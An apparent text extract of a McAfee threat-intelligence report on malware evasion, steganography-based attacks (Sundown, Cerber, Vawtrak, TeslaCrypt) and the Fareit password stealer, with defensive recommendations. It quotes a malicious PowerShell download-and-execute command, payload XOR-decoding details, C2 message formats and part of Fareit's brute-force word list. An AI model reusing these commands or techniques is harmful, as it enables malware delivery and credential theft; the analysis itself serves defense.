plolpi+$inbex+$ahak+$qykni+$ypdyxka+$jryzbo+$irjuv+$ynok+$uglidl+$imnef+$egegu+$emyske+$
upec+$evjapi+$hepu+$irrac+$sibgij);\ Set-ExecutionPolicy Bypass -Scope Process; $path=($env:temp+’’\
agzabf.exe’’),;(New-Object System.Net.Webclient),.DownloadFile(‘’ht tp://saudail-alpin.no/point.gkp’’,$path)
Set-ExecutionPolicy Bypass -Scope Process; $path=($env:temp+’’\agzabf.exe’’),;(New-Object System.Net.
Webclient),.DownloadFile(‘’http://saudail-alpin.no/point.gkp’’,$path))
agzabf.exe (PID: 2944)
agzabf.exe (PID: 3236)
explorer.exe (PID: 2628)
Figure 28: The PowerShell command drops an NSIS-packed file (agzabf.exe, hash: c52950316a6d5bb7ecb65d37e8747b46), which injects
monkshood.dll (hash: 895c6a498afece5020b3948c1f0801a2) into the process explorer.exe. The evasion technique used here is DLL injection,
which injects code into a running process.

Evasion Technique Trends
The most common evasion techniques include:
■■

■■

■■

Obfuscation: Protects data, variables, and network
communications. Randomizes names of variables or functions. Can
be performed using XOR or any other encoding technique.
Environment checking: Avoids analysis; malware detects tools or
artefacts related to virtual environments.
Sandbox detection: Malware performs disk checks to detect files
or processes related to a sandbox.

Share this Report

McAfee Labs Threats Report, June 2017 | 27

Key Topics

The following statistics, from Virus Total and McAfee, are derived from
samples known to contain sandbox evasion techniques.

Sandbox Evasion Techniques
1.5%

24.0%

Anti-automated sandbox

36.9%

VMware detection
Virtual box detection
Qemu detection

19.2%

Other anti-VM

18.5%

Source: Virus Total and McAfee, 2017.

Malware use many other techniques to evade detection. Detecting monitoring
and Windows hooking (changing the behavior of internal Windows functions)
are common. Escalating privileges is popular for disabling antimalware tools
or performing other actions that require administrator privileges.

Other Evasion Techniques
Windows hook
Thread injection

24.8%

25.6%

Escalate privilege
DLL injection
Disable registry

7.1%

4.9%

Disable ﬁrewall

4.7%
4.4%
1.0%
3.0%

Disable DEP

24.5%

Disable antimalware
Detect monitoring

Source: Virus Total and McAfee, 2017.

Share this Report

McAfee Labs Threats Report, June 2017 | 28

Key Topics

The security industry is developing new detection techniques based on
machine learning, which can examine behavior and make a prediction
whether an executable is malicious.

Figure 29: Interest in machine learning has been growing steadily.
Source: Google Trends.

Authors of malware evasion
techniques are now looking for
ways to evade machine learning
security techniques, which
are growing in use by security
vendors.

The security industry is highly interested in machine learning, as are attackers.
In March, security researchers observed the first malware sample, Cerber
ransomware, that evades detection based on machine learning. Cerber
uses several files for each stage of infection, injecting them dynamically
into running processes. The challenge for these attackers is that machine
learning detects malicious files based on features and not on signatures. In
this example, Cerber used a separate loader to inject the payload, instead of
running a routine inside it. This technique allowed Cerber to run undetected
by machine learning though not by traditional antimalware engines.
Another growing evasion technique is firmware infection, which we expect will
be especially popular for attacking Internet of Things devices.
Inserting malicious code into firmware is a very effective way to avoid
detection. Firmware malware can take control of many system components,
including the keyboard, microphone, and file system. It cannot be detected
by the operating system because the infection occurs in Ring -1, the deepest
point in the kernel, where the malware enjoys many privileges and there are
few security checks.

Share this Report

McAfee Labs Threats Report, June 2017 | 29

Key Topics

Firmware-Based Evasion Techniques
3

Applications

Least
privileged

2

Drivers

1

Drivers

0

Kernel

-1

Firmware

Most
privileged

To detect this kind of threat and easily analyze firmware, McAfee Advanced
Threat Research released the open-source tool Chipsec. You can check a
whitelist to find if the firmware has been compromised with the following
commands:

Figure 30: Dumping firmware with the Chipsec framework.

Share this Report

McAfee Labs Threats Report, June 2017 | 30

Key Topics

Figure 31: Checking dumped firmware against a whitelist to detect any modifications.

Protecting against evasive malware
Learning about malware evasion techniques is the first step in a journey to
better protect against evasive malware.
Building a security program to protect against evasive malware should be
based on three foundational components.
■■

■■

■■

People: Security practitioners must be trained to properly respond
to security incidents and to properly manage current security
technology. Attackers commonly use social engineering to infect
users. Without internal awareness and training, users will leave
some windows open for attackers.
Process: Clear structures and internal processes must be in
place so that security practitioners can be effective. Security best
practices (updates, backups, governance, intelligence, incident
response plan, and more) are the keys to a powerful and effective
security team.
Technology: Technology supports the team and processes. It
should be nurtured and enhanced so that it can adapt to new
threats.

Actionable policies and procedures to protect against evasive
malware
The most important defense against malware infections is users. Users must
be aware of the risk of downloading and installing applications that come
from potentially risky sources. Users must also learn that malware can be
inadvertently downloaded while browsing.
Always keep web browsers and add-ons up to date and antimalware on
endpoints and network gateways upgraded and updated to the latest
versions.

Share this Report

McAfee Labs Threats Report, June 2017 | 31

Key Topics

Solution Brief

Protecting
Against Evasive
Malware
As detailed in the McAfee Labs Threats Report: June 2017, evasive malware
masks itself to avoid detection. It hides by piggybacking or misusing
legitimate applications. It recognizes when it i’s being analyzed in a sandbox
and delays execution, waiting days, weeks, even months for an opportunity
to strike.
Building a security program to protect against evasive malware should be based on three
foundational components.
■

■

■

People: Security practitioners must be trained to properly respond to security incidents
and to properly manage current security technology. Attackers commonly use social
engineering to infect users. Without internal awareness and training, users will leave
some windows open for attackers.
Process: Clear structures and internal processes must be in place so that security
practitioners can be eﬀective. Security best practices (updates, backups, governance,
intelligence, incident response plans, and more) are the keys to a powerful and eﬀective
security team.
Technology: Technology supports the team and processes. It should be nurtured and
enhanced so that it can adapt to new threats.

Actionable policies and procedures to protect against evasive malware
■

■

■

The most important defense against malware infections is users. Users must be aware
of the risk of downloading and installing applications that come from potentially risky
sources. Users must also learn that malware can be inadvertently downloaded while
browsing.
Always keep web browsers and add-ons up to date and antimalware on endpoints and
network gateways upgraded and updated to the latest versions.
Do not allow systems on the trusted network that are not distributed and certiﬁed by the
corporate IT security group. Evasive malware can be easily disseminated by unprotected
systems connected to the trusted network.

To learn how McAfee products
can help protect against
evasive malware, click here.

Do not allow systems on the trusted network that are not distributed and
certified by the corporate IT security group. Evasive malware can be easily
disseminated by unprotected systems connected to the trusted network.
Evasive malware can hide inside legitimate software previously Trojanized
by an attacker. To prevent a successful attack of this type, we highly
recommended tightened software delivery and distribution mechanisms. It is
always a good idea to have a central repository of corporate applications from
which users can download approved software.
In instances where users are authorized to install applications that have not
been previously validated by the IT security group, educate users to install
only applications with trusted signatures from known vendors. It is very
common for “harmless” applications offered online to have embedded evasive
malware.
Avoid application downloads from non-web sources. The likelihood of
downloading malware from Usenet groups, IRC channels, instant messaging
clients, or peer-to-peer systems is very high. Links to websites in IRC and
instant messages also frequently point to infected downloads.
Implement an educational program for phishing attack prevention. Malware is
commonly distributed by phishing attacks.
Leverage threat intelligence feeds combined with antimalware technology.
This combination will help speed up threat detection.

Conclusion
For malware to perform its malicious actions, it must remain undetected
and stealthy. As security technology becomes more sophisticated, evasion
techniques have also become more sophisticated. This competition has led to
a robust underground market for the very best evasion technologies, including
fully undetectable malware. Some of these services use evasion techniques
that are unknown to the security industry.
Malware evasion techniques continue to evolve and are now deployed for
use at just about any stage of an attack. Several campaigns use the same
techniques to spread but also to avoid analysis and detection, as shown with
Dridex and Locky. Old evasion tricks are still popular and effective by even the
most well-known malware.
To protect against evasive malware, we must first understand it. We must
study each breach to learn why the security technology did not stop the
attack.
To learn how McAfee products can help protect against evasive malware, click
here.

Share this Report

McAfee Labs Threats Report, June 2017 | 32

Key Topics

Hiding in plain sight: The concealed
threat of steganography
—Diwakar Dinkar
Steganography is the art and science of secret hiding. The term steganography
is derived from the Greek words stegos, meaning “cover,” and grafia, meaning
“writing.” Thus “covered writing.”

Stegano
=
Covered

+

Graphy
=
Writing

=

Steganography
=
Covered writing

The concept of steganography is not new; it has been around for centuries.
About 440 BCE, the Greek ruler Histiaeus employed an early version of
steganography that involved shaving the head of a slave, tattooing a message
on his scalp, waiting for the hair to regrow and hide the secret message, and
then sending him to deliver the message. Recipients shaved his head again
to uncover the message. Another Greek, Demaratus, wrote a message on the
wooden backing for a wax tablet that the Persians planned to attack Sparta.
He then covered the message with a fresh layer of wax. The seemingly blank
tablet delivered the message. There are also stories of secret messages
written in invisible ink or hidden in love letters. (The first character of each
sentence can be used to spell a secret, for example.) Steganography was used
by prisoners and soldiers during World War II because mail in Europe was
carefully inspected.

Steganography, the art and
science of secret hiding, can also
be used to hide information in
the digital world.

Steganography in the digital world
Steganography can also be used to hide information in the digital world. To
digitally hide a secret message, we need a wrapper or container as a host file.
Wrappers can be images, audio tracks, video clips, or text files. The following
images show how a text message can be hidden in a cover image with
minimal change to the file and no visible change to the image.

Hidden message

Steganography
embedding algorithm
Cover
image

Steganographic
image

Share this Report

McAfee Labs Threats Report, June 2017 | 33

Key Topics

Steganography, cryptography, watermarking
Steganography, cryptography, and watermarking are used to hide
information. Cryptography hides a message using an encryption algorithm
and sends it as cypher text. Steganography hides a secret message within a
seemingly legitimate message. Watermarking is slightly different: It uses a
signature to identify the origin and all copies are marked in the same way.
These three methods are the most common for hiding information.

Hiding information

Watermarking

Cryptography

Steganography

Steganography in cyberattacks
Malware constantly evolves to evade surveillance and detection. To avoid
detection, some malware uses digital steganography to hide its malicious
content within a seemingly innocent cover file. But that raises an obvious
question: If malware must decrypt the hidden data, won’t an antimalware
product simply detect the decryption routine?
Most antimalware signatures detect malicious content in the configuration
file. With steganography, the configuration file is embedded in the cover file.
Further, the resulting steganographic file may decrypt into main memory,
further reducing the chance of detection. Finally, it is extremely difficult to
detect the presence of hidden information such as a configuration file, binary
update, or bot command inside steganographic files. Unfortunately, the use of
steganography in cyberattacks is easy to implement and hard to detect.

The first known use of
steganography in a cyberattack
was in the Duqu malware, which
surfaced in 2011.

The first known use of steganography in a cyberattack was in the Duqu
malware, which surfaced in 2011. Duqu’s main purpose was to gather
information from a victim’s system. Duqu encrypted and embedded the
data into a JPEG file and sent it to its control server as an image file, thereby
raising no suspicion. In 2014, researchers discovered that a variant of the Zeus
banking Trojan (ZeusVM) used image steganography to hide commands it
sent to infected systems. Later that year, we learned Lurk delivered additional
malware using a steganographic technique. In case of Lurk, a white BMP
image file contained an encrypted URL that downloaded a second payload
once it had been decrypted. Recently, image steganography has been used by
Stegoloader (also known as Gatak) and by different malvertising campaigns.

Zbot, Lurk, ZeusVM,
MiniDuke, CosmicDuke

2010

2012

Duqu, Shady RAT,
Alureon rootkit

2014

2016

Vawtrak, Stegoloader,
Sundown, AdGholas,
Magento CC, DNSChanger

Share this Report

McAfee Labs Threats Report, June 2017 | 34

Key Topics

Digital steganography types
Digital steganography can be divided into text, image, audio, and video
steganography. Text steganography is one of the earliest and most difficult
to employ. It uses written natural language to conceal a secret message.
Text steganography is challenging due to the lack of redundancy in text
documents. Audio steganography transmits hidden information by modifying
an audio signal in an imperceptible manner, and embedding the secret
message as noise into an audio file at a frequency out of the range of human
hearing. For example, spread spectrum steganography is often used to send
hidden messages through radio waves. Similarly, in video steganography the
secret message hides in the video stream.
Image steganography
The most common form of digital steganography uses images. To understand
image-based steganography, we need to understand the concept of a digital
image. Images are usually based on 8-bit or 24-bit color combinations. Each
pixel typically consists of 8 bits (1 byte) for a black-and-white image; or 24
bits (3 bytes) for a color image, with one byte each for red, green, and blue
(generally known as the RGB format). For example, RGB (218,150,149) means
R = 11011010, G = 10010110, and B = 10010101.

Red
1 byte = 8 bit

Green
1 byte = 8 bit

Blue
1 byte = 8 bit

Pixel
3 bytes = 24 bits

We can divide image steganography into the following general domains:

Image steganography

Spatial domain
technique

Transform domain
technique

Distorion
techniques

Masking and
ﬁltering technique

In the spatial domain technique, we can hide secret data by direct
manipulation on the pixel value of the cover image. Least significant bit–
based steganography is one of the most popular and simplest spatial domain
techniques.
The transform domain technique is also known as the frequency domain
technique because it involves the embedding of secret data in the frequency
or transform of the cover image. This technique is a more complex method of
hiding data in an image.
Share this Report

McAfee Labs Threats Report, June 2017 | 35

Key Topics

In the distortion technique, the secret data is embedded using signal
distortion. This technique needs the information of the cover image on the
decoder side because it checks the differences between the original cover
image and the distorted cover image to extract the secret message.
Masking and filtering is another common steganography technique. It hides
or masks the secret data over the cover image by modifying the brightness or
luminance of some parts of the image.
How does an attacker hide a message in an image? We can understand the
process of hiding by the spatial domain example given below:

3 pixels before
insertion

3 pixels after
insertion

1 pixel

0010 0110
1110 1000
1100 1001

0010 0110
1110 1001
1100 1000

1 pixel

0010 0111
1100 1001
1110 1001

1 pixel

1100 1001
0010 0111
1110 1011
MSB

+

Inserting letter ‘A’
has an ASCII value
of 65 (decimal),
which is 01000001
in binary.

=

0010 0110
1100 1000
1110 1000
1100 1000
0010 0111
1110 1011

LSB

Figure 32: The right-hand-column values in red were modified by the transformation. MSB
and LSB stand for “most significant bit” and “least significant bit,” respectively.

Modified bits in an image are
visually imperceptible, yet they
can be decrypted and used by
malware once the image file is
received on the victim’s system.

A steganography-embedding algorithm is used to modify the image, changing
the least significant bits to embed the letter “A” in three pixels of the color
image. The changed least significant bits are visually imperceptible, yet they
can be decrypted and used by the malware once the image file is received on
the victim’s system.
We can summarize the digital steganography process:

Cover ﬁle/
hidden message

Embedding algorithm

Steganographic ﬁle

Communication medium

Steganographic ﬁle

Extracting algorithm

Hidden message

Share this Report

McAfee Labs Threats Report, June 2017 | 36

Key Topics

The hidden message and cover file are passed through the embedding
algorithm to hide the message within the cover file. The resulting
steganographic file is sent through a communications channel to the target
system. Finally, the hidden message is extracted by applying an extraction
algorithm to the steganographic file.
How does steganography help exploit kits?
Steganography is now used in several malvertising and exploit kit attacks. The
Sundown exploit kit started to appear in 2015. At that time, it was not very
advanced and seems to have stolen most of its code from the Angler, Nuclear,
and RIG exploit kits. In October 2016, Sundown evolved and started making
use of steganography.
Recent variants of the Sundown exploit kit
We can understand recent variants of the Sundown exploit kit with the
following infection chain:

The popular Sundown exploit kits
uses steganography to hide codetargeting vulnerabilities.

1

2

3

4

5

User

Website or ad

Exploit server

Flash/IE

Payload

User visits
compromised
website or clean
website with
malware ads

Exploit server
with landing page
and image
steganography to
bypass AV
products

Infects user
using Flash and
IE exploits

Downloads
payload

A Sundown attack begins when a victim visits a compromised website or a
clean website with malicious ads. The victim is automatically redirected to the
exploit kit.
The following image shows network traffic in January in which victims were
redirected toward the Sundown landing page. The page retrieved and
downloaded PNG images.

Figure 33: Steganography used in the Sundown infection chain.

Share this Report

McAfee Labs Threats Report, June 2017 | 37

Key Topics

In most cases, the PNG file appears to be a white image:

Figure 34: Viewing a downloaded malicious PNG file.

Even the hex view shows a PNG file with a proper PNG header:

Figure 35: Viewing the hex of a downloaded malicious PNG file.

But this PNG file data is encoded and hides malicious code within it.
The Sundown kit landing page contains a decoding routine that unlocks
the PNG file and extracts the malicious content. The landing page is heavily
obfuscated.

Share this Report

McAfee Labs Threats Report, June 2017 | 38

Key Topics

Figure 36: Obfuscated code that decodes the PNG file.

Figure 37: Deobfuscated landing page code.

The code loads the PNG file and has a URL that downloads a payload after
successful exploitation. The decoding logic appears at the end of the script.

Share this Report

McAfee Labs Threats Report, June 2017 | 39

Key Topics

Figure 38: The decoding logic for the PNG file.

After successfully decoding the PNG, we see its output:

Figure 39: Code to exploit the vulnerability CVE-2015-2419 after decoding the PNG data.

Further analysis of this exploit code decoded from the PNG image shows
that it includes the exploit code targeting CVE-2015-2419, a vulnerability in
the JavaScript handling of Internet Explorer. This exploit code also contains
shellcode that will be executed after successfully exploiting the vulnerability.

Share this Report

McAfee Labs Threats Report, June 2017 | 40

Key Topics

Figure 40: Shellcode to attack CVE-2015-2419.

This Sundown kit was found to be distributing Cerber ransomware from the IP
address 93.190.143.82 with the help of steganography.
SHA256 hashes related to this analysis:
■■

■■

■■

A5E991B647BC60A9323A214C71146F534D4195182C3C630B228
3BF1D3CEC8D6D
EFB5308AA78FFD53E799F7411CC92A564219C27B15D630B6BFA
EC674DF8B5923
EEDBD8CDDBA5ED59D86207E37252406E2E1DB1762098A6293E
A25762E555E75B

Cerber hides in .jpg file
The Cerber ransomware family is currently quite popular. The initial
propagation vector is macro code embedded in a Microsoft document file.

Figure 41: When the victim opens a Cerber-infected document, it drops a malicious .vbs file,
which executes using wscript.exe and downloads mhtr.jpg from a malicious website.

Figure 42: This network capture shows a request for mhtr.jpg.

Share this Report

McAfee Labs Threats Report, June 2017 | 41

Key Topics

Figure 43: The downloaded mhtr.jpg (SHA256 hash: 8f14257937bd6d45c2455592614331ebb
10078d8bfd9e6acf1b502ed609ef131) shows it is related to Zen Coding.

Figure 44: The header of mhtr.jpg.

Figure 45: A single XOR byte key is used to encrypt the executable file and is embedded
using steganography at the offset 0x25c9.

From offset 0x25c9 each byte is encrypted using an XOR byte key 0x73. The
decryption process:

3E29E37370737373777373738C8C7373

XOR

4d5a90000300000004000000ﬀﬀ0000

0x73

Share this Report

McAfee Labs Threats Report, June 2017 | 42

Key Topics

Figure 46: The decrypted file.

The encrypted file’s payload is a Nullsoft installer file (SHA256 hash:
37397f8d8e4b3731749094d7b7cd2cf56cacb12dd69e0131f07dd78dff6f262b)
that is dropped in the %APPDATA% folder and used for ransomware activity.

Vawtrak started using
steganography to hide its settings
in favicons, small icons associated
with websites or web pages.

Steganography used by Vawtrak, Zbot, Lurk, and Stegoloader
In early 2015, Vawtrak started using steganography to hide its settings in
favicons. The malware downloads a favicon.ico file from a server hosted on
TOR using the tor2web service. This favicon.ico image is the one displayed by
browsers at the left side of a URL. Generally, each website contains a favicon
.ico image, so security products seeing such requests would typically not test
them for validity. Next, the malware extracts a least significant bit from each
pixel and constructs a URL for downloading its configuration file.
One variant of the Zbot malware also uses steganography to hide its
configuration data. This variant downloads a JPEG on the victim’s system. The
configuration data hides inside this image. Later, the malware extracts the
configuration data from the image and performs further malicious actions.
Lurk uses steganography to download other malware onto targeted systems.
Instead of simply downloading and executing a malicious binary, Lurk first
downloads a BMP image. It uses a least-significant-bit algorithm to embed
encrypted URLs into the image file. It extracts the embedded URLs from the
image file and then downloads additional malware.
Stegoloader installs malware on victims’ systems to steal sensitive
information. On successful execution, Stegoloader downloads a PNG image
from a legitimate website. It uses steganography to embed its main module’s
code inside the downloaded PNG. The malware retrieves the hidden data by
applying a steganographic extraction algorithm.
Data exfiltration and steganography
Data exfiltration, also known as data theft, is the unauthorized transfer of
sensitive information from a computer or a server. In 2016, we saw attacks
related to Magento, an online e-commerce platform. The attacks used image
steganography to hide payment card details.

Share this Report

McAfee Labs Threats Report, June 2017 | 43

Key Topics

In general, Magento websites handle credit card information with a core
content management system file, cc.php. Thus the obvious location for
attackers to place malicious code on Magento sites is at [magento_root] /app/
code/core/Mage/Payment/Model/Method/cc.php.

Figure 47: A legitimate prepareSave () method.

Generally, the malware inserts malicious code inside the prepareSave ()
method, but it might be present in any other method as well. After execution,
the malicious code collects the payment card details and hides inside a local
image file, such as a real product picture. Once done with the collection, the
attacker simply downloads the image file (typical for an e-commerce website)
and extracts the hidden data.

Network steganography is the
newest form of this discipline.
Unused fields within the TCP/IP
protocol header are used to hide
data. This method is on the rise
because attackers can send an
unlimited amount of information
through the network using this
technique.

Network steganography
Network steganography is the latest type of digital steganography used by
malware. This form is on the rise because attackers can send an unlimited
amount of information through the network. Some malware authors use
unused fields within the TCP/IP protocol header to hide data.
In some cases, malware hides its control server traffic within simple DNS and
HTTP requests. The malware sends requests for nonexistent domains from
a hardcoded DNS server that is the actual control server. The commands are
embedded and obfuscated using a simple Base64-encoding technique within
the DNS response.
We analyzed TeslaCrypt, which uses HTTP error messages to hide its
communications and is downloaded through the Neutrino exploit kit.

Share this Report

McAfee Labs Threats Report, June 2017 | 44

Key Topics

Figure 48: Initially, the TeslaCrypt ransomware payload communicates with a remote server
through Base64-encoded messages with “404” error messages.

In the comments section of the HTML page, which is Base64-encoded, we
found “<!—c3VjY2Vzcw==—>,” which decodes to the response “success.”
Then the malware responds with the following encoded data, as shown in the
next figure.
cmd&<GUID of Machine >&<Logged-in Username: System Name: Domain
Name>&<Windows Version and Platform> &<AV product Info>&<Date and
Time of Execution>

Figures 49–50: Malware response to a successful infection.

Share this Report

McAfee Labs Threats Report, June 2017 | 45

Key Topics

Figure 51: In reply, the malware receives another Base64-encoded 404 error message with a
downloading link.

The decoded string has the following format:
<random ldap timestamp>#<>#<>#LOADER hxxp://103.*****.148/*****.
exe#

Conclusion
Steganography will continue to become more popular. It is an old technique
that is once again showing its effectiveness. Because steganography can often
bypass antimalware detections, more threats will use this technique.
Policies and procedures
Tighten software delivery and distribution mechanisms used
to protect against insider threats. Maintain a central repository
of trusted corporate applications where users can download
approved software. Do not allow users to download software from
unknown sources.
■■

■■

■■

■■

With the help of image editing software, look for steganography
markers such as slight color differences in images. Also, a large
number of duplicate colors in an image could be an indicator of a
steganographic attack.
Control the use of steganographic software. The presence of
steganography software on any corporate system should be
prohibited unless specifically required for business purposes.
Deploy this type of software only in a contained network segment.
Install only applications with trusted signatures from trusted
vendors.

Share this Report

McAfee Labs Threats Report, June 2017 | 46

Key Topics

Solution Brief

■■

Protecting Against
Steganographic
Threats
Steganography—the art and science of secret hiding—can also be used
to hide information in the digital world. A message can be hidden inside
an image, audio track, video clip, or text ﬁle. It can be used for legitimate
purposes, but more often stenography is used by malware.
To avoid detection, some malware uses digital steganography to hide its
malicious content within a seemingly innocent “cover” ﬁle. This evasion
technique takes advantage of the fact that most antimalware signatures
detect malicious content in the malware’s conﬁguration ﬁle. With
steganography, the conﬁguration ﬁle is embedded in the cover ﬁle. In
addition, the resulting steganographic ﬁle may decrypt into main memory,
further reducing the chance of detection. Finally, it is extremely diﬃcult to
detect the presence of hidden information such as a conﬁguration ﬁle, binary
update, or bot command inside steganographic ﬁles. Unfortunately, the use
of steganography in cyberattacks is easy to implement and hard to detect.

■■

Policies and procedures for protecting from steganographic attacks
McAfee recommends that organizations take the following steps to protect against steganographic
threats.
■

■

Tighten software delivery and distribution mechanisms to protect against insider
threats. It is always a good idea to have a central repository of trusted corporate
applications from which users can download approved software—avoiding the risky
practice of letting network users download software from unknown sources that may
contain stenographic code.
Look closely at images. With the help of image editing software, look for steganography
markers such as slight color diﬀerences in images. A large number of duplicate colors in
an image could be an indicator of a steganography attack.

To learn how McAfee products
can help protect against
steganographic threats, click
here.

■■

Configure antimalware to detect binders. Antimalware software
should be configured to identify the presence of binders where
steganographic images could be contained.
If a steganographic attack is successful, a virtualized system
architecture combined with proper network segmentation may
help contain an outbreak because the secure and verifiable boot
process used by virtualized systems and continuous network traffic
monitoring helps isolate applications.
Monitor outbound traffic. Identify the presence of successful
steganographic attacks by monitoring outbound traffic.

To learn how McAfee products can help protect against steganographic
threats, click here.

Share this Report

McAfee Labs Threats Report, June 2017 | 47

Key Topics

The growing danger of Fareit, the
password stealer
—RaviKant Tiwari and Yashashree Gund
We live in an era in which many people are developing increasingly dependent
relationships with their personal electronic devices. This trend makes it more
important than ever that we protect this connection from threats. Credentials
are our primary method of security and have thus become a primary attack
vector for cybercriminals intent on profiting from those relationships.
Unfortunately, human behavior is the weakest link in those relationships.
Most people minimize the importance of good security hygiene. They do not
take care when creating passwords, thereby exposing themselves to bruteforce attacks. Even worse, they sometimes do not protect themselves at all by
not setting or changing default passwords. This behavior gives rise to attacks
such as the Mirai botnet, which we highlighted in the McAfee Labs Threats
Report: April 2017.

As more sensitive information
is moved to the passwordprotected cloud, the value of
stolen credentials has increased.
As a result, password stealers
have become more popular.

Gradually, cloud computing is changing the way we use computers. It is
increasingly common among consumers and businesses to store important
information and services in the cloud. Yet we generally use the same
credentialing scheme, subject to the same weaknesses in human behavior, to
gain access to cloud-based information and services. And because the data
and computing are centralized, the cloud has become an ever more attractive
target for cybercriminals.
As we foresaw in the McAfee Labs 2017 Threats Prediction Report, malware that
targets credential theft will become increasingly important until we develop a
better approach to credentials.
Using password stealers for credential theft
Password stealers are used in the early stages of nearly all major advanced
persistent threats. This type of malware adds economic value to the overall
attack lifecycle. Lateral malware movement in networks is mainly dependent
on credentials harvested by password stealers.

Fareit, one of the top password
stealers, can snatch credentials
from more than 100 applications.

New password-stealing malware variants have enhanced their capabilities
from grabbing banking credentials to Bitcoins and gaming currency. Fareit,
also known as Pony, is one of the top malware families currently used for
stealing passwords; it can snatch credentials from more than 100 applications,
including email, FTP, instant messaging, VPN, web browsers, and many more.
The following graph shows the number of unique Fareit incident submissions
received by McAfee Labs during the past three years.

Share this Report

McAfee Labs Threats Report, June 2017 | 48

Key Topics

Fareit Customer Incidents
1,800
1,600
1,400
1,200
1,000
800
600
400
200
0
Q1

Q2

2015

Q3

Q4

Q1

Q2

2016

Q3

Q4

Q1
2017

Source: McAfee, 2017.

Origin
Fareit was first discovered in 2011 by Microsoft. Fareit’s robustness and strong
capabilities have made it the most popular password-stealing malware for
more than five years.
The following graph shows unique Fareit detections from McAfee and
Microsoft sources, ranging from 2011–2017.

New Fareit Detections
160,000
140,000
120,000
100,000
80,000
60,000
40,000
20,000
0
2011

Share this Report

2012

2013

2014

2015

2016

2017

Source: McAfee and Microsoft, 2017.

McAfee Labs Threats Report, June 2017 | 49

Key Topics

The following heat map shows the intensity of distribution of Fareit control
servers in Q1 2017.

Fareit Control Server Heat Map

High intensity

Medium intensity

Low intensity

Source: Cybercrime Tracker.

The earliest tracked version of Fareit was Version 1.7, which included most of
the capabilities that the latest version, 2.2, possesses today.
Fareit (we will use Fareit and Pony interchangeably to reference this family
of malware) is among the most successful password-stealing software
ever developed. This success story has led to its use in almost all major
cyberattacks whose intent is to steal sensitive information.
In this report, we will discuss the evolution of Fareit and its association with
other malware across different platforms. We will also explain the likely use of
this ageless malware in the US Democratic National Committee (DNC) attack
last fall.

Infection vectors
Fareit spreads through mechanisms such as phishing/spam email, DNS
poisoning, and exploit kits.

One of the most popular
methods to distribute Fareit is
through phishing campaigns.

Spam
The following diagram shows how spam campaigns distribute Fareit. The
victim receives a malicious spam email containing a Word document,
JavaScript, or archive file as an attachment. Once the user opens the
attachment, Fareit infects the system. It then downloads additional malware
based on its current campaign and sends stolen credentials to the control
server.

Share this Report

McAfee Labs Threats Report, June 2017 | 50

Key Topics

Get

Fareit infects
system

W

Other campaign
malware hosted
on infected sites

JS
Post

Fareit control
server

DNS poisoning
In this technique, malware such as Rbrut gains router administration access
through a brute-force attack. It then changes the primary DNS settings and
redirects infected systems to rogue DNS servers.
The rogue DNS servers redirect users to malicious websites, which deliver
Fareit.

youtube.com

youtube.com

Fake IP address

Host system
infected with Rbrut

Router DNS server
settings page

Rogue DNS
server

youtube.com/setup.exe

Fareit hosted
on rogue server

Bot and control server architecture

Attackers can purchase Fareit
code on the dark web or they
can purchase a Fareit control
panel service hosted by another
attacker.

Unlike most botnets, which are operated by specific groups and have
centralized control servers, Pony can be purchased by any willing attacker
on the dark web. The purchaser sets up a personal control server to start
the attack process or purchases a control panel service hosted by another
attacker. The purchased panel provides the stolen credential reports.
The Pony project is divided into three parts:
■■

■■

■■

Pony Builder (PonyBuilder.exe): A set of programs for creating the
build-client “Pony Bot,” which is built using the masm32 compiler,
included in the package.
Pony Bot: A client that must be downloaded to target systems, to
collect and send passwords to the control server.
A set of server-side PHP scripts: Includes an administration panel
and a script gate (gate.php), to which stolen passwords are sent.

Share this Report

McAfee Labs Threats Report, June 2017 | 51

Key Topics

Stolen credentials

Malware
author

Malware attacker
Sets up control server,
uses Pony Builder to
build Pony Bot EXE/DLL

Control
server

Pony Bot distribution network

Pony Builder

Pony Bot infected
systems

Pony Bot EXE/DLL

Pony Builder: This tool allows attackers to create their own Pony Bot. They
can specify the control server address to which stolen credentials and other
stats will be sent by the bot.

Figure 52: Pony Builder source files.

Share this Report

McAfee Labs Threats Report, June 2017 | 52

Key Topics

Figure 53: Pony Builder user interface.

Pony Bot: This is the program cybercriminals use to spread the malware client
that steals passwords from victims. Pony Bot has several capabilities:
■■

Steal passwords

■■

Download and execute arbitrary malware

■■

Perform DDoS attacks

■■

Steal cryptocurrency wallets

■■

Steal FTP credentials

Pony Bot is mostly coded in assembly language and can be released in either
DLL or EXE format. This provides Fareit with the flexibility to morph and serve
a variety of purposes.
To collect passwords, Pony Bot uses a nonstandard approach. When the
client starts, it automatically collects stolen passwords and necessary data for
decryption into special container files called reports and transfers them to the
server, where they are decrypted. Each report can contain dozens and even
hundreds of passwords, as well as other supporting information.
The Pony Bot client does not contain any decryption algorithms, only simple
functions for reading files and registry data. All password decryption is
performed by the web server. This is not a resource-intensive operation
because most of the encryption algorithms are trivial. A decryption server
spends on average fewer than 10ms processing a report containing
passwords.

Share this Report

McAfee Labs Threats Report, June 2017 | 53

Key Topics

Figure 54: Different modules of the Pony Bot client.

Figure 55: These modules contain necessary code that Pony Bot requires to successfully
compile.

Fareit is often incorporated into
attack sequences by campaign
authors.

Many campaign authors incorporate Fareit into their attack methodologies.
For example, we saw the author of the Andromeda botnet (also known as
Gamarue) refer to Fareit as the “titanic work of the author of miracle (Fareit
Bot)” when someone asked him to create a password stealer for Andromeda.
The Andromeda author demonstrated how to make Pony into a plug-in for the
Andromeda botnet.
Pony variants have different purposes. We will discuss later how Pony
was crafted for the DNC attack, packaging just code to steal user and FTP
passwords.

Share this Report

McAfee Labs Threats Report, June 2017 | 54

Key Topics

Inner workings
The Fareit bot starts by executing anti-disassembly and anti-emulation
techniques at the beginning of each module. It then initializes API addresses to
carry out various operations. Fareit tries to impersonate a privileged process
by acquiring the local user token of the account from which it is currently
executing. This user is ignored in a brute-force procedure performed in a later
stage. Next, Fareit decrypts the stored word list that it uses to brute force
other available users on the victim’s system. Once the decryption is complete,
it starts the ScanAndSend stealing routine in the current user’s context and
sends all stolen credentials to the control server. After that, it runs the loader
component of the bot to download and execute more malware, which may be
part of its pay-per-install campaign.
Next, Fareit terminates its current impersonation and tries to impersonate
other users on the victim’s system. To achieve this, Fareit attempts to login to
the account using the “username: username” pair, the “username: lowercase
username” pair, and finally the deciphered word list as the password
for this username. Once the login is successful and the Fareit process is
impersonating the logged-in user, it again executes ScanAndSend under the
context of this additional user.
samantha
michelle
david
eminem
scooter
asdfasdf
sammy
baby
diamond
maxwell
55555
justin
james
chicken
daniellei
loveyou2
prince
